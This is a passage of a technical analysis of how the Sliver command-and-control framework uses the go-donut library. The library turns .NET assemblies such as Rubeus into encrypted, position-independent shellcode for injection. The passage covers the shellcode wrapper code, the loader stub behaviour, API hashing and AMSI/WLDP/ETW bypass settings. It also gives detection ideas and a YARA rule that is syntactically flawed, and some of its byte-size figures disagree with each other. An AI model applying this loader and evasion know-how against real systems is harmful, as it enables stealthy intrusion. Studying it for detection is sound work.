func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
    w := new(bytes.Buffer)
    instanceLen := uint32(payload.Len())

    // 1. CALL instruction (E8) - pushes next instruction address onto stack
    w.WriteByte(0xE8)

    // 2. Instance length (4 bytes, little-endian)
    binary.Write(w, binary.LittleEndian, instanceLen)

    // 3. Instance data (DonutInstance + DonutModule + assembly)
    payload.WriteTo(w)

    // 4. POP ECX - pops the return address (points to instance start)
    w.WriteByte(0x59)

    // 5. Architecture-specific loader stub
    switch arch {
    case X32:
        // === 32-bit loader ===
        w.WriteByte(0x5A)  // POP EDX
        w.WriteByte(0x51)  // PUSH ECX
        w.WriteByte(0x52)  // PUSH EDX
        w.Write(LOADER_EXE_X86)  // ~500 bytes of x86 assembly

    case X64:
        // === 64-bit loader ===
        w.Write(LOADER_EXE_X64)  // ~600 bytes of x64 assembly

    case X84:
        // === Polyglot: both 32-bit and 64-bit ===
        w.WriteByte(0x31)  // XOR EAX, EAX
        w.WriteByte(0xC0)
        w.WriteByte(0x48)  // DEC EAX (32-bit) / REX.W prefix (64-bit)
        w.WriteByte(0x0F)  // JL (conditional jump based on architecture)
        w.WriteByte(0x88)

        // Calculate jump offset for x64 code
        x64Offset := len(LOADER_EXE_X86) + 4
        binary.Write(w, binary.LittleEndian, uint32(x64Offset))

        // 32-bit loader
        w.Write(LOADER_EXE_X86)

        // 64-bit loader
        w.Write(LOADER_EXE_X64)
    }

    return w, nil
}
```

**Output**: Complete position-independent shellcode ready for injection

---

## Loader Stub Details

The loader stubs are **hardcoded assembly** embedded as byte arrays in the vendored code.

### X64 Loader Stub

**File**: `vendor/github.com/Binject/go-donut/donut/loader_exe_x64.go`

**Variable**: `LOADER_EXE_X64` (~600 bytes)

**Functionality**:
1. **API Resolution**:
   - Walks PEB (Process Environment Block) to find loaded DLLs
   - Parses export tables to find function addresses
   - Uses Maru hash to match API names

2. **DLL Loading**:
   - Calls `LoadLibraryA("mscoree.dll")` - CLR hosting API
   - Calls `LoadLibraryA("ole32.dll")` - COM initialization

3. **CLR Initialization**:
   - `CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &pMetaHost)`
   - `pMetaHost->GetRuntime("v4.0.30319", &IID_ICLRRuntimeInfo, &pRuntimeInfo)`
   - `pRuntimeInfo->GetInterface(&CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &pRuntimeHost)`
   - `pRuntimeHost->Start()`

4. **AppDomain Creation**:
   - `pRuntimeHost->GetDefaultDomain(&pAppDomain)`
   - Or `pRuntimeHost->CreateDomain(domainName, &pAppDomain)` if custom name specified

5. **Assembly Loading**:
   - Allocates safe array for assembly bytes
   - `pAppDomain->Load_3(safeArray, &pAssembly)`

6. **Method Invocation**:
   - For EXE: `pAssembly->get_EntryPoint(&pMethodInfo)` → `pMethodInfo->Invoke_3()`
   - For DLL: `pAssembly->GetType(className)` → `pType->GetMethod(methodName)` → `pMethodInfo->Invoke_3()`

### X86 Loader Stub

**File**: `vendor/github.com/Binject/go-donut/donut/loader_exe_x86.go`

**Variable**: `LOADER_EXE_X86` (~500 bytes)

**Functionality**: Same as x64 but with 32-bit calling conventions (stdcall vs fastcall)

### API Imports

**File**: `vendor/github.com/Binject/go-donut/donut/types.go:289-354`

**51 Windows APIs** are resolved by the loader stubs:

```go
var api_imports = []API_IMPORT{
    // Kernel32 - Process/memory management
    {Module: "kernel32", Name: "LoadLibraryA"},
    {Module: "kernel32", Name: "GetProcAddress"},
    {Module: "kernel32", Name: "VirtualAlloc"},
    {Module: "kernel32", Name: "VirtualFree"},
    {Module: "kernel32", Name: "VirtualProtect"},
    {Module: "kernel32", Name: "GetModuleHandleA"},
    // ... (20 kernel32 APIs)

    // OLE32 - COM initialization
    {Module: "ole32", Name: "CoInitializeEx"},
    {Module: "ole32", Name: "CoCreateInstance"},
    {Module: "ole32", Name: "CoUninitialize"},
    // ... (8 ole32 APIs)

    // OLEAUT32 - SafeArray management
    {Module: "oleaut32", Name: "SafeArrayCreate"},
    {Module: "oleaut32", Name: "SafeArrayCreateVector"},
    {Module: "oleaut32", Name: "SafeArrayPutElement"},
    {Module: "oleaut32", Name: "SafeArrayDestroy"},
    // ... (10 oleaut32 APIs)

    // MSCOREE - CLR hosting
    {Module: "mscoree", Name: "CorBindToRuntime"},
    {Module: "mscoree", Name: "CLRCreateInstance"},

    // ... (51 total APIs)
}
```

---

## Encryption and Hashing

### Chaskey Cipher

**File**: `vendor/github.com/Binject/go-donut/donut/donut_crypt.go`

**Algorithm**: Chaskey (128-bit block cipher, 16 rounds)

**Mode**: CTR (Counter Mode) for stream encryption

```go
const (
    CipherBlockLen = 16     // 128-bit blocks
    CipherKeyLen   = 16     // 128-bit keys
)

func Encrypt(mk []byte, ctr []byte, data []byte) []byte {
    // Pad data to 16-byte boundary
    padded := make([]byte, (len(data)+15) & ^15)
    copy(padded, data)

    // Encrypt each 16-byte block using CTR mode
    for i := 0; i < len(padded); i += CipherBlockLen {
        // Generate keystream by encrypting counter
        keystream := Chaskey(mk, ctr)

        // XOR plaintext with keystream
        for j := 0; j < CipherBlockLen; j++ {
            padded[i+j] ^= keystream[j]
        }

        // Increment counter
        incrementCounter(ctr)
    }

    return padded[:len(data)]
}

func Chaskey(masterKey []byte, data []byte) []byte {
    // 16-round permutation cipher
    // ... (implementation details)
}
```

**What Gets Encrypted**:
- Everything in `DonutInstance` from the `ApiCount` field onwards
- Includes: API count, DLL names, bypass strings, GUIDs, module length
- **Does NOT encrypt**: Instance length, encryption keys, IV, API hashes
- **Does NOT encrypt**: The module data (DonutModule + assembly)

### Maru Hash

**Algorithm**: Maru (custom hash using Speck cipher)

**Purpose**: Hash API names to avoid storing plaintext strings

```go
const (
    MARU_MAX_STR  = 64     // Max string length
    MARU_BLK_LEN  = 16     // Block length
    MARU_HASH_LEN = 8      // 64-bit hash output
    MARU_IV_LEN   = 8      // IV length
)

func Maru(input []byte, iv uint64) uint64 {
    // 1. Pad input to 16-byte boundary
    padded := make([]byte, 16)
    copy(padded, input)

    // 2. Convert to two 64-bit values
    p0 := binary.LittleEndian.Uint64(padded[0:8])
    p1 := binary.LittleEndian.Uint64(padded[8:16])

    // 3. Encrypt using Speck cipher with IV as key
    ivBytes := make([]byte, 16)
    binary.LittleEndian.PutUint64(ivBytes, iv)
    binary.LittleEndian.PutUint64(ivBytes[8:], iv)

    hash := Speck(ivBytes, p0 ^ p1)

    return hash
}

func Speck(mk []byte, p uint64) uint64 {
    // Speck 64/128 cipher (27 rounds)
    // ... (implementation details)
}
```

**Usage**:
- At generation time: All 51 API names are hashed with a random IV
- Hashes are stored in `DonutInstance.Hash[]` array
- At runtime: Loader exports are hashed with the same IV and compared

---

## Donut Configuration

### DonutConfig Structure

**File**: `vendor/github.com/Binject/go-donut/donut/types.go:78-110`

```go
type DonutConfig struct {
    Arch       DonutArch      // X32, X64, or X84
    Type       ModuleType     // NET_DLL, NET_EXE, DLL, EXE, VBS, JS, XSL
    InstType   InstanceType   // PIC (embedded) or URL (download)
    Parameters string         // Command-line parameters

    Entropy    uint32         // 1=none, 2=random names, 3=encryption
    Thread     uint32         // Run as thread
    Compress   uint32         // 1=none, 2=LZNT1, 3=Xpress, 4=Xpress Huffman
    Unicode    uint32         // Convert to Unicode
    OEP        uint64         // Original entry point
    ExitOpt    uint32         // 1=exit thread, 2=exit process
    Format     uint32         // 1=raw, 2=base64, 3=C array, etc.

    Domain     string         // .NET AppDomain name
    Class      string         // .NET class name
    Method     string         // .NET method name
    Runtime    string         // .NET runtime version
    Bypass     int            // 1=skip, 2=abort on fail, 3=continue on fail

    Module     *DonutModule   // Generated module
    ModuleName string         // Module file name
    URL        string         // Remote download URL (InstType=URL)
    ModuleMac  uint64         // Module MAC
    ModuleData *bytes.Buffer  // Combined module+assembly data

    inst       *DonutInstance // Generated instance
    instLen    uint32         // Instance length
    Verbose    bool           // Enable verbose output
}
```

### Constants

**Module Types**:
```go
const (
    DONUT_MODULE_NET_DLL ModuleType = 1  // .NET DLL
    DONUT_MODULE_NET_EXE             = 2  // .NET EXE
    DONUT_MODULE_DLL                 = 3  // Native DLL
    DONUT_MODULE_EXE                 = 4  // Native EXE
    DONUT_MODULE_VBS                 = 5  // VBScript
    DONUT_MODULE_JS                  = 6  // JavaScript
    DONUT_MODULE_XSL                 = 7  // XSL with embedded script
)
```

**Architectures**:
```go
const (
    X32 DonutArch = iota  // 32-bit only
    X64                   // 64-bit only
    X84                   // Both (polyglot)
)
```

**Entropy Levels**:
```go
const (
    DONUT_ENTROPY_NONE    = 1  // No obfuscation (debug)
    DONUT_ENTROPY_RANDOM  = 2  // Random names only
    DONUT_ENTROPY_DEFAULT = 3  // Random names + Chaskey encryption
)
```

**Instance Types**:
```go
const (
    DONUT_INSTANCE_PIC = 1  // Self-contained (embedded module)
    DONUT_INSTANCE_URL = 2  // Download module from URL
)
```

### Sliver's Configuration

**For .NET Assemblies** (`DonutFromAssembly`):
```go
config.Bypass = 3                    // Continue on AMSI/WLDP bypass failure
config.Runtime = "v4.0.30319"        // .NET 4.0 CLR (hardcoded)
config.Format = 1                    // Raw bytes
config.Arch = donutArch              // From user input
config.Entropy = 3                   // Full encryption
config.Unicode = 0                   // ASCII
config.Type = DONUT_MODULE_NET_EXE   // Or NET_DLL
config.InstType = DONUT_INSTANCE_PIC // Embedded
config.Compress = 0                  // No compression (implicit)
config.Thread = 0                    // Not used (implicit)
config.ExitOpt = 1                   // Exit thread (default)
```

**For Native PE Files** (`DonutShellcodeFromPE`):
```go
config.Bypass = serverConf.DonutBypass  // From server config (1-3)
config.Format = 1                       // Raw bytes
config.Arch = donutArch
config.Entropy = 0                      // Disabled for native code
config.Compress = 1                     // No compression
config.ExitOpt = 1                      // Exit thread
config.Type = DONUT_MODULE_EXE          // Or DLL
config.InstType = DONUT_INSTANCE_PIC
```

---

## Server Configuration

### DonutBypass Setting

**File**: `server/configs/server.go:141`

```go
type ServerConfig struct {
    // ...
    DonutBypass int `json:"donut_bypass"`  // 1=skip, 2=abort, 3=continue
    // ...
}
```

**Default Value**: `3` (continue on bypass failure)

**Validation**:
```go
if config.DonutBypass < 1 || config.DonutBypass > 3 {
    config.DonutBypass = 1  // Reset to skip if invalid
}
```

**Bypass Levels**:

| Level | Value | Behavior |
|-------|-------|----------|
| **Skip** | 1 | Don't attempt AMSI/WLDP/ETW bypass |
| **Abort** | 2 | Abort execution if bypass fails |
| **Continue** | 3 | Continue execution even if bypass fails (default) |

**What Gets Bypassed**:
- **AMSI** (Antimalware Scan Interface) - Prevents memory scanning
- **WLDP** (Windows Lockdown Policy) - Bypasses AppLocker/WDAC
- **ETW** (Event Tracing for Windows) - Disables telemetry

**Note**: Bypass is handled by the loader stubs, not configurable per-assembly. The `DonutBypass` setting only applies to native PE files (`DonutShellcodeFromPE`), not .NET assemblies (`DonutFromAssembly`), which always use `Bypass=3`.

---

## Complete Donut Execution Flow

```
┌────────────────────────────────────────────────────────────────┐
│ CLIENT COMMAND                                                 │
│ execute-assembly /path/to/Rubeus.exe kerberoast              │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ SERVER RPC: ExecuteAssembly() (rpc-tasks.go:186)              │
│ • Read assembly bytes from /path/to/Rubeus.exe                │
│ • Extract session architecture (x64)                           │
│ • Call generate.DonutFromAssembly()                            │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ DONUTFROMASSEMBLY (server/generate/donut.go:67-86)            │
│ • Create DonutConfig with defaults                             │
│   - Bypass=3, Runtime="v4.0.30319", Entropy=3                 │
│   - Arch=X64, Type=DONUT_MODULE_NET_EXE                       │
│ • Call getDonut()                                              │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ GETDONUT (server/generate/donut.go:88-102)                    │
│ • Call donut.ShellcodeFromBytes()                              │
│ • Add stack alignment prologue (8 bytes)                       │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ SHELLCODEFROMBYTES (vendor/.../donut/donut.go)                │
│                                                                │
│ ┌──────────────────────────────────────────────────────────┐  │
│ │ STAGE 1: CreateModule()                                  │  │
│ │ • Create DonutModule structure                           │  │
│ │ • ModType = DONUT_MODULE_NET_EXE                        │  │
│ │ • Runtime = "v4.0.30319"                                │  │
│ │ • Domain = RandomString(8) = "xJ4kL9pQ"                 │  │
│ │ • Param = "kerberoast"                                  │  │
│ │ • Len = sizeof(Rubeus.exe) = 142336 bytes               │  │
│ │ • Combine: [DonutModule header] + [Rubeus.exe bytes]    │  │
│ │ Output: ModuleData = 143,336 bytes                       │  │
│ └──────────────────────────────────────────────────────────┘  │
│                            ↓                                   │
│ ┌──────────────────────────────────────────────────────────┐  │
│ │ STAGE 2: CreateInstance()                                │  │
│ │ • Create DonutInstance structure                         │  │
│ │ • Generate encryption keys:                              │  │
│ │   KeyMk = [random 16 bytes]                             │  │
│ │   KeyCtr = [random 16 bytes]                            │  │
│ │ • Generate Maru IV = 0x8F3A2B1C4D5E6F70                 │  │
│ │ • Hash 51 API names:                                     │  │
│ │   Hash[0] = Maru("kernel32LoadLibraryA", IV)           │  │
│ │   Hash[1] = Maru("kernel32GetProcAddress", IV)         │  │
│ │   ... (51 total hashes)                                 │  │
│ │ • Copy .NET GUIDs (12 total)                            │  │
│ │ • Set DllNames = "kernel32;ole32;oleaut32;mscoree"      │  │
│ │ • Encrypt from ApiCount onwards with Chaskey            │  │
│ │ • Combine: [DonutInstance] + [ModuleData]               │  │
│ │ Output: InstanceData = 146,936 bytes                     │  │
│ └──────────────────────────────────────────────────────────┘  │
│                            ↓                                   │
│ ┌──────────────────────────────────────────────────────────┐  │
│ │ STAGE 3: Sandwich()                                      │  │
│ │ • Create position-independent wrapper:                   │  │
│ │   [0xE8]                    ; CALL $+5                  │  │
│ │   [0x8E 0x3D 0x02 0x00]    ; Instance length            │  │
│ │   [InstanceData...]         ; 146,936 bytes             │  │
│ │   [0x59]                    ; POP ECX                   │  │
│ │   [LOADER_EXE_X64...]       ; 600 bytes                 │  │
│ │ Output: Final shellcode = 147,545 bytes                  │  │
│ └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ ADD STACK ALIGNMENT PROLOGUE                                   │
│ • Prepend 8 bytes:                                             │
│   [0x48 0x83 0xE4 0xF0]     ; AND RSP, 0xFFFFFFFFFFFFFFF0    │
│   [0x48 0x83 0xC4 0x08]     ; ADD RSP, 8                      │
│ • Final output: 147,553 bytes                                  │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ CREATE PROTOBUF MESSAGE                                        │
│ • InvokeExecuteAssemblyReq.Data = shellcode (147,553 bytes)   │
│ • Send to implant via C2 channel                              │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ IMPLANT INJECTS SHELLCODE INTO SACRIFICIAL PROCESS            │
│ (see main document for injection flow)                         │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│ LOADER STUB EXECUTES (in sacrificial process memory)          │
│                                                                │
│ 1. RESOLVE APIS (via Maru hash)                               │
│    • Walk PEB to find kernel32.dll                            │
│    • Parse export table, hash each export with Maru + IV      │
│    • Compare against Hash[] array in instance                 │
│    • Build function pointer table (51 APIs)                   │
│                                                                │
│ 2. DECRYPT INSTANCE (if entropy=3)                            │
│    • Use KeyMk + KeyCtr to decrypt encrypted section          │
│    • Chaskey cipher in CTR mode                               │
│                                                                │
│ 3. LOAD DLLS                                                   │
│    • LoadLibraryA("mscoree.dll")                              │
│    • LoadLibraryA("ole32.dll")                                │
│    • LoadLibraryA("oleaut32.dll")                             │
│                                                                │
│ 4. INITIALIZE CLR                                              │
│    • CLRCreateInstance(&CLSID_CLRMetaHost, ...)               │
│    • pMetaHost->GetRuntime("v4.0.30319", ...)                 │
│    • pRuntimeInfo->GetInterface(&CLSID_CorRuntimeHost, ...)   │
│    • pRuntimeHost->Start()                                     │
│                                                                │
│ 5. CREATE APPDOMAIN                                            │
│    • pRuntimeHost->CreateDomain("xJ4kL9pQ", ...)              │
│                                                                │
│ 6. LOAD ASSEMBLY                                               │
│    • SafeArrayCreate(VT_UI1, 142336)                          │
│    • Copy Rubeus.exe bytes to SafeArray                       │
│    • pAppDomain->Load_3(safeArray, &pAssembly)                │
│                                                                │
│ 7. INVOKE ENTRY POINT                                          │
│    • pAssembly->get_EntryPoint(&pMethodInfo)                  │
│    • Create args SafeArray with "kerberoast"                  │
│    • pMethodInfo->Invoke_3(NULL, args, &returnVal)            │
│                                                                │
│ 8. RUBEUS EXECUTES                                             │
│    • Console.WriteLine() → stdout → buffer capture            │
└────────────────────────────────────────────────────────────────┘
```

---

## Shellcode Size Analysis

### Size Breakdown

For a typical .NET assembly:

```
Stack Alignment Prologue:           8 bytes
CALL + Instance Length:             5 bytes
DonutInstance (unencrypted):       60 bytes
DonutInstance (encrypted):      3,540 bytes
DonutModule header:             1,000 bytes
.NET Assembly:                142,336 bytes (Rubeus.exe example)
POP instruction:                    1 byte
Loader stub (x64):                600 bytes
─────────────────────────────────────────
TOTAL:                        147,550 bytes
```

**Overhead**: ~5,214 bytes (3.6% for 142KB assembly)

### Size Formula

```
Total = 8 + 5 + 3,600 + 1,000 + assembly_size + 1 + 600
Total ≈ assembly_size + 5,214 bytes
```

**Examples**:
- 5 KB assembly → ~10 KB shellcode (100% overhead)
- 100 KB assembly → ~105 KB shellcode (5% overhead)
- 1 MB assembly → ~1.005 MB shellcode (0.5% overhead)
- 5 MB assembly → ~5.005 MB shellcode (0.1% overhead)

---

## Integration Points Summary

### 1. Server RPC Layer
- **File**: `server/rpc/rpc-tasks.go:186`
- **Call**: `generate.DonutFromAssembly()`
- **Input**: Raw .NET assembly bytes + parameters
- **Output**: Donut shellcode ready for injection

### 2. Generate Package
- **File**: `server/generate/donut.go`
- **Functions**:
  - `DonutFromAssembly()` - For .NET assemblies
  - `DonutShellcodeFromPE()` - For native PE files
  - `DonutShellcodeFromFile()` - From file path
- **Responsibilities**: Configuration, architecture mapping, calling vendored library

### 3. Vendored Donut Library
- **Location**: `vendor/github.com/Binject/go-donut/donut/`
- **Entry Point**: `donut.ShellcodeFromBytes()`
- **Output**: Complete position-independent shellcode

### 4. Sideload Integration
- **File**: `server/rpc/rpc-tasks.go:241-289`
- **Function**: `Sideload()`
- **Use Case**: Converting native DLLs to shellcode for injection

---

## Key Files Reference

| Component | File Path | Key Functions/Variables |
|-----------|-----------|-------------------------|
| **Sliver Wrapper** | `server/generate/donut.go` | `DonutFromAssembly()`, `DonutShellcodeFromPE()` |
| **Main Library** | `vendor/.../donut/donut.go` | `ShellcodeFromBytes()`, `CreateModule()`, `CreateInstance()`, `Sandwich()` |
| **Types** | `vendor/.../donut/types.go` | `DonutConfig`, `DonutModule`, `DonutInstance` |
| **Crypto** | `vendor/.../donut/donut_crypt.go` | `Chaskey()`, `Encrypt()`, `Maru()`, `Speck()` |
| **X86 Loader** | `vendor/.../donut/loader_exe_x86.go` | `LOADER_EXE_X86` (byte array) |
| **X64 Loader** | `vendor/.../donut/loader_exe_x64.go` | `LOADER_EXE_X64` (byte array) |
| **Utils** | `vendor/.../donut/utils.go` | `RandomString()`, `GenerateRandomBytes()` |
| **Server Config** | `server/configs/server.go` | `ServerConfig.DonutBypass` |

---

## Security Implications

### Obfuscation Features

1. **API Hashing**: API names not stored in plaintext, hashed with random IV
2. **Encryption**: Chaskey cipher encrypts sensitive instance data
3. **Random Names**: AppDomain names randomized (entropy=3)
4. **Position-Independent**: No hardcoded addresses, works at any memory location
5. **Polyglot Support**: X84 mode creates shellcode that works on both 32-bit and 64-bit

### Detection Opportunities

1. **CLR Loading**: Loading `mscoree.dll` in unexpected processes
2. **Memory Patterns**: Donut instance structure has recognizable patterns
3. **API Call Sequences**: Specific CLR initialization call pattern
4. **SafeArray Usage**: Creating large SafeArrays for assembly bytes
5. **Entropy**: High entropy in shellcode due to encryption

### YARA Rule Potential

```yara
rule Donut_Shellcode {
    strings:
        $call_pop = { E8 ?? ?? ?? ?? [0-1000] 59 }  // CALL + POP pattern
        $clr_guid = { 0x3d, 0x3c, 0xa2, 0x2f, 0xb2, 0xc7, 0x49, 0x8e }  // CLRMetaHost CLSID
        $api_hash_array = { [64] 00 00 00 00 }  // 64 * 8-byte hashes
    condition:
        all of them
}
```

---

## Summary

**Donut in Sliver**:
- Fully vendored Go implementation from github.com/Binject/go-donut
- Called server-side only, never on implants
- Converts .NET assemblies to position-independent shellcode in 3 stages
- Uses Chaskey encryption and Maru hashing for obfuscation
- Hardcoded .NET 4.0 runtime (`v4.0.30319`)
- Always uses full entropy (encryption enabled)
- Adds ~5KB overhead to assembly size
- Generated shellcode contains embedded CLR loader stubs
- Supports x86, x64, and polyglot (x84) architectures

**Key Advantages**:
- No .NET runtime needed on server (pure Go)
- Position-independent (works at any address)
- Self-contained (no external dependencies at runtime)
- Encrypted (API hashes + Chaskey cipher)
- Flexible (supports EXE/DLL, methods/classes)

**Key Limitations**:
- Server-side generation only (adds latency)
- Fixed .NET 4.0 runtime (no 2.0/3.5 support in Sliver's config)
- No compression in Sliver's implementation
- Adds ~5KB minimum overhead
- AMSI/WLDP bypass limited to loader stub level
